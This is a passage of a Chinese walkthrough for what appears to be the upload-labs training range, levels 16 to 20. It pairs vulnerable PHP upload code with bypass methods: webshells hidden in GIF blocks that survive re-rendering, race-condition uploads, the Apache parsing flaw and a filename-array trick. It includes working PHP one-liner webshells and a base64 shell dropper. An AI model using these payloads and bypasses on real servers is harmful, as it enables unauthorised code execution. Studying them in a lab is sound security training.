                srand(time());
                $newfilename = strval(rand()).".jpg";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagejpeg($im,$img_path);
                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "png") && ($filetype=="image/png")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefrompng($target_path);

            if($im == false){
                $msg = "该文件不是png格式的图片！";
                @unlink($target_path);
            }else{
                 //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".png";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagepng($im,$img_path);

                @unlink($target_path);
                $is_upload = true;               
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "gif") && ($filetype=="image/gif")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromgif($target_path);
            if($im == false){
                $msg = "该文件不是gif格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".gif";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagegif($im,$img_path);

                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }
    }else{
        $msg = "只允许上传后缀为.jpg|.png|.gif的图片文件！";
    }
}

源码中使用imagecreatefrom...函数对图片文件进行二次渲染。该函数调用了PHP GD库（GD库，是php处理图形的扩展库），对图片进行了转换。

## 扩展知识

**二次渲染**

二次渲染是图像处理技术，通过服务器端对上传的图像进行重新处理生成新图像，主要用于防范文件上传风险。其核心原理包括接收文件、格式检查、解码、重新编码和保存新图像。

服务器接收上传的图像文件后，通过解码、去除恶意代码再重新编码生成新图片，防止存储或使用带有恶意代码的原始文件。

GIF文件由多个数据块组成，imagecreatefromgif 主要处理图像数据块、全局颜色表等核心块，会忽视一些注释块、应用程序扩展快，被忽视的部分不会被二次渲染，所以可以将webshell藏在未被渲染的部分达到目的

我们可以使用010editor对比源图片文件与渲染过的图片，找到可以插入恶意代码而不会被处理的部分

## 解题方法

首先上传一张安全完整的gif图片，随后保存网页会显的图片，使用010editor打开，在010editor中点击tool→compare→选择原文件与渲染后的图片，点击下方compare栏中的match选项，蓝色的部分就是相同的，未被渲染的部分。

在其中插入一句话木马，保存图片再次上传，接着使用文件包含漏洞即可连接

# pass-17

## 代码分析

$is_upload = false;
$msg = null;

if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');  //白名单
    $file_name = $_FILES['upload_file']['name'];		//文件上传名字
    $temp_file = $_FILES['upload_file']['tmp_name'];		//文件上传临时路径
    $file_ext = substr($file_name,strrpos($file_name,".")+1);		//上传文件后缀
    $upload_file = UPLOAD_PATH . '/' . $file_name;		//文件上传路径
      //移动文件上传临时路径到服务器中
    if(move_uploaded_file($temp_file, $upload_file)){
        //判断后缀是否在白名单中
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
        }else{
            $msg = "只允许上传.jpg|.png|.gif类型文件！";
            //在服务器中删除已经上传的文件
            unlink($upload_file);
        }
    }else{
        $msg = '上传出错！';
    }
}

观察代码发现，本关会先将代码上传到服务器，随后才进行白名单验证。如果我们高频词、并发性地发送文件上传请求，服务器会在处理多个请求时出现时序混乱，使文件绕过原本的安全校验逻辑，导致恶意文件被成功上传

## 扩展知识

条件竞争（Race Condition）是一种并发编程漏洞，发生在多个线程或进程同时访问共享资源（如变量、文件或内存）时，因缺乏同步机制导致非预期的执行结果，可能被利用于安全攻击或系统故障。

条件竞争的核心是并发执行流对共享资源的无序访问。其产生需满足三个条件：

‌并发性‌：至少两个执行流（如线程或进程）同时运行。‌

‌共享对象‌：多个执行流访问同一资源（如全局变量、文件或数据库记录）。‌

‌状态改变‌：至少一个执行流修改资源状态，否则仅读取不会引发问题。‌

漏洞的根本原因是“竞争窗口”（Race Window）——资源状态未同步的短暂间隙。例如，线程A检查余额后、线程B更新前，线程C可能插入操作，导致数据不一致。‌

## 解题方法

### 方法一

创建包含生成小马语句的文件1.php，它就能在服务器中写入一个木马文件且不会被删除

<?php fputs(fopen('shell.php', 'w'), '<?php @eval($_POST["a"]);?>'); ?>

<?php
$a='PD9waHAgQGV2YWwoJF9QT1NUWyJhIl0pOz8+';
$myfile=fopen("shell.php","w");
 fwrite($myfile,base64_decode($a));
 fclose($myfile);
?> 

上传1.txt，抓包发送到intruder模块，同时访问靶场IP/uploads/1.php，同样抓包，发送到intruder模块

设置null payload，无限发送，二者同时开始攻击，等到服务器中成功出现shell.php则说明竞争成功，直接访问shell.php即可

# less-18

## 代码分析

//index.php
$is_upload = false;
$msg = null;
if (isset($_POST['submit']))
{
    require_once("./myupload.php");
    $imgFileName =time();
    $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);
    $status_code = $u->upload(UPLOAD_PATH);
    switch ($status_code) {
        case 1:
            $is_upload = true;
            $img_path = $u->cls_upload_dir . $u->cls_file_rename_to;
            break;
        case 2:
            $msg = '文件已经被上传，但没有重命名。';
            break; 
        case -1:
            $msg = '这个文件不能上传到服务器的临时文件存储目录。';
            break; 
        case -2:
            $msg = '上传失败，上传目录不可写。';
            break; 
        case -3:
            $msg = '上传失败，无法上传该类型文件。';
            break; 
        case -4:
            $msg = '上传失败，上传的文件过大。';
            break; 
        case -5:
            $msg = '上传失败，服务器已经存在相同名称文件。';
            break; 
        case -6:
            $msg = '文件无法上传，文件不能复制到目标目录。';
            break;      
        default:
            $msg = '未知错误！';
            break;
    }
}

//myupload.php
class MyUpload{
......
......
...... 
  var $cls_arr_ext_accepted = array(
      ".doc", ".xls", ".txt", ".pdf", ".gif", ".jpg", ".zip", ".rar", ".7z",".ppt",
      ".html", ".xml", ".tiff", ".jpeg", ".png" );

......
......
......  
  /** upload()
   **
   ** Method to upload the file.
   ** This is the only method to call outside the class.
   ** @para String name of directory we upload to
   ** @returns void
  **/
  function upload( $dir ){
    
    $ret = $this->isUploadedFile();
    
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->setDir( $dir );
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->checkExtension();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->checkSize();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );    
    }
    
    // if flag to check if the file exists is set to 1
    
    if( $this->cls_file_exists == 1 ){
      
      $ret = $this->checkFileExists();
      if( $ret != 1 ){
        return $this->resultUpload( $ret );    
      }
    }

    // if we are here, we are ready to move the file to destination

    $ret = $this->move();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );    
    }

    // check if we need to rename the file

    if( $this->cls_rename_file == 1 ){
      $ret = $this->renameFile();
      if( $ret != 1 ){
        return $this->resultUpload( $ret );    
      }
    }
    
    // if we are here, everything worked as planned :)

    return $this->resultUpload( "SUCCESS" );
  
  }
......
......
...... 
};

## 扩展知识

**apache解析漏洞**

在apache 1.x，2.x版本中，apache解析文件的规则是从右往左开始解析。如果无法解析后缀名，就会往左判断，直到遇到可解析的版本为止。

例如，上传test.php.7z，apache无法解析.7z，就会向左判断，将此文件解析为php文件。

## 解题方法

上传shell.php.7z文件，php会识别后缀为合法的.7z文件并上传到服务器，但是通过验证后会立即将shell.php部分重命名为时间戳＋随机数，所以php代码仍旧无法生效。

所以本题需要利用apache解析漏洞+条件竞争，上传生成小马的1.php.7z文件，白名单验证会将其当做合法文件上传至服务器，上传后再进行重命名。我们利用条件竞争，在重命名前尝试打开文件，这样apache就会解析这个文件 ，接着由于解析漏洞生成木马文件

完整解题步骤：

创建1.php.7z文件

<?php
$a='PD9waHAgQGV2YWwoJF9QT1NUWyJhIl0pOz8+';
$myfile=fopen("shell.php","w");
 fwrite($myfile,base64_decode($a));
 fclose($myfile);
?> 

上传、抓包并发送到攻击模块，并抓包靶机IP/uploads/1.php.7z同样发送到攻击模块。

二者均设置null payload，无限重复攻击，等到服务器中出现shell.php即上传成功

# pass-19

## 代码分析

$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");

        $file_name = $_POST['save_name'];
        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);

        if(!in_array($file_ext,$deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) { 
                $is_upload = true;
            }else{
                $msg = '上传出错！';
            }
        }else{
            $msg = '禁止保存为该类型文件！';
        }

    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}

## 解题方法

本题相当于前面数种方法的集结
.
. 
\.
默认数据流
.user.ini
.php0x00.jpg
等等方法都可以绕过

# pass-20

## 代码分析

$is_upload = false;
$msg = null;

if(!empty($_FILES['upload_file'])){
    //检查MIME
    //对content-type进行检查
    //$_FILES['upload_file']：代表用户上传的文件，其中upload_file是表单中文件上传字段的名称。
    //$_FILES['upload_file']['type']：获取上传文件的 MIME 类型。
    $allow_type = array('image/jpeg','image/png','image/gif');
    if(!in_array($_FILES['upload_file']['type'],$allow_type)){
        $msg = "禁止上传该类型文件!";
    }else{
        //检查文件名
        //判断save_name是否为空，不为空就使用其作为文件名，为空就用文件原来的名字
        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
        //判断名字是不是数组，如果不是数组，就用.对名字进行分割。比如1.php,被分割为file[0]=1、file[1]=php
        if (!is_array($file)) {
            $file = explode('.', strtolower($file));
        }
        //获取file数组的最后一个，也就是php
        $ext = end($file);
        $allow_suffix = array('jpg','png','gif');
        //如果后缀不在白名单之内，就禁止上传；如果在，就允许上传
        if (!in_array($ext, $allow_suffix)) {
            $msg = "禁止上传该后缀文件!";
        }else{
            //reset()获取数组第一个内容，即1;cout($file)获取数组中非空内容的数量即2,;链接后缀$file[2 - 1]即$file[1]
            $file_name = reset($file) . '.' . $file[count($file) - 1];
            //文件暂时路径
            $temp_file = $_FILES['upload_file']['tmp_name'];
            //保存路径
            $img_path = UPLOAD_PATH . '/' .$file_name;
            //移动文件
            if (move_uploaded_file($temp_file, $img_path)) {
                $msg = "文件上传成功！";
                $is_upload = true;
            } else {
                $msg = "文件上传失败！";
            }
        }
    }
}else{
    $msg = "请选择要上传的文件！";
}

## 关键函数

1. $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
2. if (!is_array($file)判断如果名字不是数组就根据.进行分割，那么可以修改save_name使其是一个数组，那么就不会进行分割；
3.  $ext = end($file);只获取最后一个，因此只要数组最后的内容符合要求就可以上传文件
4. $file_name = reset($file) . '.' . $file[count($file) - 1];拼接文件名；
file[0]=1.php,file[1]=88,file[3]=jpg这个数组经过count(file)之后返回3,$file[count($file) - 1]获取的值实际上不是jpg而是$file[3-1]=$file[2]=null，因此$file_name=1.php.+null，而Windows会自动将文件后缀中的空格和特殊字符删除，所以可以成功上传后缀名为php 的一句话木马
绕过流程

## 解题方法

上传木马文件，抓包修改content-type，将save_name修改为数组

索引[0]为php文件，png文件索引[x]（x>2）